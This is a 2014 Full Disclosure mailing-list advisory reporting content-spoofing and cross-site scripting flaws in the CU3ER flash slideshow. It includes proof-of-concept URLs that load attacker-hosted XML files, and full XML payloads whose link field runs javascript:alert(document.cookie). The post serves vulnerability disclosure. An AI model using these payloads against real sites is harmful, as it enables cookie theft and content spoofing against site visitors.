
Date: Fri, 18 Apr 2014 19:38:50 +0300
From: "MustLive" <mustlive@...security.com.ua>
To: <submissions@...ketstormsecurity.org>,
	<fulldisclosure@...lists.org>
Subject: [FD] CS and XSS vulnerabilities in CU3ER

Hello list!

These are Content Spoofing and Cross-Site Scripting vulnerabilities in
CU3ER. Which I found in October 2013 at one web site. This is popular flash
file and in Google's index there are up to million web sites with it (near
1060000 sites in October, now near 717000 sites).

In last years I wrote about similar vulnerabilities in millions of flash
files (on hundreds millions of web sites), including in different flash
video and audio players, such as FLV Player, flvPlayer, moxieplayer, JW
Player, JW Player Pro, CorePlayer, jPlayer, VideoJS, GDD FLVPlayer,
flv-player, mp3-player and Dewplayer.

-------------------------
Affected products:
-------------------------

Vulnerable are CU3ER 1.24 and previous versions.

-------------------------
Affected vendors:
-------------------------

MADEBYPLAY
http://getcu3er.com

----------
Details:
----------

Content Spoofing (Content Injection) (WASC-12):

http://site/cu3er.swf?xml=http://site2/1.xml

File 1.xml:

<?xml version="1.0" encoding="UTF-8"?>
<cu3er>
<slides>
<slide>
<url>1.jpg</url>
<link>http://websecurity.com.ua</link>
</slide>
</slides>
</cu3er>

Cross-Site Scripting (WASC-08):

http://site/cu3er.swf?xml=http://site2/xss.xml

File xss.xml:

<?xml version="1.0" encoding="UTF-8"?>
<cu3er>
<slides>
<slide>
<url>1.jpg</url>
<link>javascript:alert(document.cookie)</link>
</slide>
</slides>
</cu3er>

For cross-domain attacks it's needed to have crossdomain.xml at web site
with xml-files.

These are examples of CS and XSS attacks on version CU3ER 0.9.2. For the
last version 1.24 it's needed different xml-files and different parameter is
set to flash-file.

CS (WASC-12):

http://site/cu3er.swf?xml_location=http://site2/1.xml

File 1.xml:

<data>
  <project_settings>
    <width>800</width>
 <height>600</height>
  </project_settings>
  <settings>
    <folder_images>/</folder_images>
    <start_slide>1</start_slide>
    <auto_play>true</auto_play>
    <randomize_slides>false</randomize_slides>
    <pause_on_rollover>true</pause_on_rollover>
  </settings>
  <preloader type="linear" align_pos="MC" width="200" height="20" x="0"
y="0">
   </preloader>
  <controls>
    <prev_button align_pos="BR" width="30" height="30" x="-51" y="-20">
      <auto_hide time="3">false</auto_hide>
      <hide_on_transition>true</hide_on_transition>
      <background round_corners="15,0,0,15">
        <tweenShow tint="0xffffff" alpha="0.2" x="0" y="0" scaleX="1"
scaleY="1"/>
        <tweenOver tint="0xffffff" alpha="0.9" x="0" y="0" scaleX="1"
scaleY="1"/>
        <tweenHide tint="0xffffff" alpha="0" x="0" y="0" scaleX="1"
scaleY="1"/>
      </background>
      <symbol type="2" align_pos="MC" x="0" y="0">
        <tweenShow alpha="1" scaleX="0.3" scaleY="0.3" tint="0x2185c5"/>
        <tweenOver tint="0x2185c5" scaleX="0.4" scaleY="0.4" alpha="1" x="0"
y="0"/>
        <tweenHide tint="0x2185c5" scaleX="0.2" scaleY="0.2" alpha="0" x="0"
y="0"/>
      </symbol>
    </prev_button>
    <next_button align_pos="BR" width="30" height="30" x="-20" y="-20">
      <auto_hide time="3">false</auto_hide>
      <hide_on_transition>true</hide_on_transition>
      <background round_corners="0,15,15,0">
        <tweenShow tint="0xffffff" alpha="0.2" x="0" y="0"/>
        <tweenOver tint="0xffffff" alpha="0.9"/>
        <tweenHide tint="0xffffff" alpha="0"/>
      </background>
      <symbol type="2" align_pos="MC" x="0" y="0">
        <tweenShow alpha="1" scaleX="0.3" scaleY="0.3" tint="0x2185c5"/>
        <tweenOver tint="0x2185c5" scaleX="0.4" scaleY="0.4" alpha="1" x="0"
y="0"/>
        <tweenHide tint="0x2185c5" scaleX="0.2" scaleY="0.2" alpha="0" x="0"
y="0"/>
      </symbol>
    </next_button>
  </controls>
  <defaults>
    <slide time="5" color="0x000000">
      <image align_pos="MC" x="0" y="0" scaleX="1" scaleY="1"/>
      <link>http://websecurity.com.ua</link>
    </slide>
  </defaults>
  <slides>
    <slide>
      <url><![CDATA[1.jpg]]></url>
    </slide>
    <transition rows="3" columns="5"/>
    <slide>
      <url><![CDATA[1.jpg]]></url>
    </slide>
  </slides>
</data>

File xss.xml:

XSS (WASC-08):

http://site/cu3er.swf?xml_location=http://site2/xss.xml

<data>
  <project_settings>
    <width>800</width>
 <height>600</height>
  </project_settings>
  <settings>
    <folder_images>/_/Security/</folder_images>
    <start_slide>1</start_slide>
    <auto_play>true</auto_play>
    <randomize_slides>false</randomize_slides>
    <pause_on_rollover>true</pause_on_rollover>
  </settings>
  <preloader type="linear" align_pos="MC" width="200" height="20" x="0"
y="0">
  </preloader>
  <controls>
    <prev_button align_pos="BR" width="30" height="30" x="-51" y="-20">
      <auto_hide time="3">false</auto_hide>
      <hide_on_transition>true</hide_on_transition>
      <background round_corners="15,0,0,15">
        <tweenShow tint="0xffffff" alpha="0.2" x="0" y="0" scaleX="1"
scaleY="1"/>
        <tweenOver tint="0xffffff" alpha="0.9" x="0" y="0" scaleX="1"
scaleY="1"/>
        <tweenHide tint="0xffffff" alpha="0" x="0" y="0" scaleX="1"
scaleY="1"/>
      </background>
      <symbol type="2" align_pos="MC" x="0" y="0">
        <tweenShow alpha="1" scaleX="0.3" scaleY="0.3" tint="0x2185c5"/>
        <tweenOver tint="0x2185c5" scaleX="0.4" scaleY="0.4" alpha="1" x="0"
y="0"/>
        <tweenHide tint="0x2185c5" scaleX="0.2" scaleY="0.2" alpha="0" x="0"
y="0"/>
      </symbol>
    </prev_button>
    <next_button align_pos="BR" width="30" height="30" x="-20" y="-20">
      <auto_hide time="3">false</auto_hide>
      <hide_on_transition>true</hide_on_transition>
      <background round_corners="0,15,15,0">
        <tweenShow tint="0xffffff" alpha="0.2" x="0" y="0"/>
        <tweenOver tint="0xffffff" alpha="0.9"/>
        <tweenHide tint="0xffffff" alpha="0"/>
      </background>
      <symbol type="2" align_pos="MC" x="0" y="0">
        <tweenShow alpha="1" scaleX="0.3" scaleY="0.3" tint="0x2185c5"/>
        <tweenOver tint="0x2185c5" scaleX="0.4" scaleY="0.4" alpha="1" x="0"
y="0"/>
        <tweenHide tint="0x2185c5" scaleX="0.2" scaleY="0.2" alpha="0" x="0"
y="0"/>
      </symbol>
    </next_button>
  </controls>
  <defaults>
    <slide time="5" color="0x000000">
      <image align_pos="MC" x="0" y="0" scaleX="1" scaleY="1"/>
      <link>javascript:alert(document.cookie)</link>
    </slide>
  </defaults>
  <slides>
    <slide>
      <url><![CDATA[1.jpg]]></url>
    </slide>
    <transition rows="3" columns="5"/>
    <slide>
      <url><![CDATA[1.jpg]]></url>
    </slide>
  </slides>
</data>

------------
Timeline:
------------ 

2013.11.22 - announced at my site.
2013.11.26 - informed developer.
2013.11.28 - developer answered and promised to fix his software. But the
last version of CU3ER is still vulnerable.
2014.04.17 - disclosed at my site (http://websecurity.com.ua/6885/).

Best wishes & regards,
MustLive
Administrator of Websecurity web site
http://websecurity.com.ua



_______________________________________________
Sent through the Full Disclosure mailing list
http://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/
